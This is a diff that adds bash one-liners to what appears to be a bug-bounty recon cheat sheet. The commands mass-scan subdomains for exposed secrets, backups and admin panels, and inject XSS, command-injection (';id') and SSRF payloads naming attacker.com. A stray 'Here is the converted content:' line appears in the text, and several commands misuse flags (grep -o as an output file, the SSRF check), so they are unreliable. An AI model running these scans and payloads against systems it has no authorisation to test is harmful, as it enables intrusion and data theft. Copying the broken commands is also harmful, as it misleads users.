@@ -2410,3 +2410,111 @@ Scan for Default Tomcat Admin Panels
 ```bash
 cat subdomains.txt | httpx -silent -path /manager/html -mc 200 -o tomcat_admin_exposed.txt
 ```
+
+Here is the converted content:
+
+Look for Public Backup Files (tar/zip dumps)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/backup.tar.gz\n/db.sql') -mc 200 -o exposed_backups.txt
+```
+
+Check for Exposed Laravel Telescope Panels
+```bash
+cat subdomains.txt | httpx -silent -path /telescope -mc 200 -o laravel_telescope.txt
+```
+
+Find Exposed VNC/TeamViewer/Web RDP
+```bash
+naabu -list subdomains.txt -p 5900,3389 -silent -o remote_access_ports.txt
+```
+
+Detect Open Grafana Panels (Unauth Access)
+```bash
+cat subdomains.txt | httpx -silent -path /login -mc 200 -fr 'Grafana' -o open_grafana.txt
+```
+
+Scan for Misconfigured API Endpoints
+```bash
+cat subdomains.txt | nuclei -t misconfiguration/api-misconfiguration.yaml -o api_misconfigs.txt
+```
+
+Identify Exposed Internal DNS Resolvers
+```bash
+cat subdomains.txt | dnsx -a -resp-only -silent | grep -E '10\.|192\.168\.|172\.' -o internal_dns.txt
+```
+
+Detect Anonymous FTP Access (File Exposure)
+```bash
+nmap -p 21 --script ftp-anon -iL subdomains.txt -oN ftp_anon_scan.txt
+```
+
+Find Exposed Configuration Pages (config.php)
+```bash
+cat subdomains.txt | httpx -silent -path /config.php -mc 200 -o config_php_exposed.txt
+```
+
+Identify Publicly Available Magento Admin Panels
+```bash
+cat subdomains.txt | httpx -silent -path /admin -mc 200 -fr 'Magento' -o magento_admin_exposed.txt
+```
+
+Check for SSRF by Detecting Response Based Redirects
+```bash
+cat subdomains.txt | httpx -silent -H "X-Forwarded-For: attacker.com" -fr 'Location: attacker.com' -o ssrf_possible.txt
+```
+
+Detect Exposed Env Files (.env with Secrets)
+```bash
+cat subdomains.txt | httpx -silent -path /.env -mc 200 -o exposed_env_files.txt
+```
+
+Find XMLRPC Enabled on WordPress (Brute Force Vector)
+```bash
+cat subdomains.txt | httpx -silent -path /xmlrpc.php -mc 200 -o wordpress_xmlrpc.txt
+```
+
+Identify Open Kibana Dashboards (Sensitive Logs)
+```bash
+cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o open_kibana.txt
+```
+
+Find Servers Exposing phpinfo() (Sensitive Config)
+```bash
+cat subdomains.txt | httpx -silent -path /phpinfo.php -mc 200 -o phpinfo_exposed.txt
+```
+
+Detect Publicly Accessible Swagger APIs
+```bash
+cat subdomains.txt | httpx -silent -path /swagger-ui/ -mc 200 -o swagger_exposed.txt
+```
+
+Search for SQL Dumps and Backup Files (db.sql/db.zip)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/db.sql\n/backup.sql\n/database.sql') -mc 200 -o sql_dumps_exposed.txt
+```
+
+Detect LFI Points (path traversal)
+```bash
+cat subdomains.txt | gf lfi | httpx -silent -o lfi_possible_urls.txt
+```
+
+Identify Reflected XSS via GET Parameters
+```bash
+cat subdomains.txt | gf xss | qsreplace '"><img src=x onerror=alert(document.domain)>' | httpx -silent -fr '"><img src=x onerror=alert' -o reflected_xss.txt
+```
+
+Find Outdated WordPress Versions (Vuln Detection)
+```bash
+cat subdomains.txt | httpx -silent -path /readme.html -mc 200 -o wordpress_readme.txt
+```
+
+Search for PHPMyAdmin Exposed Panels
+```bash
+cat subdomains.txt | httpx -silent -path /phpmyadmin -mc 200 -o phpmyadmin_exposed.txt
+```
+
+Detect Command Injection Points
+```bash
+cat subdomains.txt | gf command-injection | qsreplace ';id' | httpx -silent -fr 'uid=' -o cmd_injection.txt
+```
+
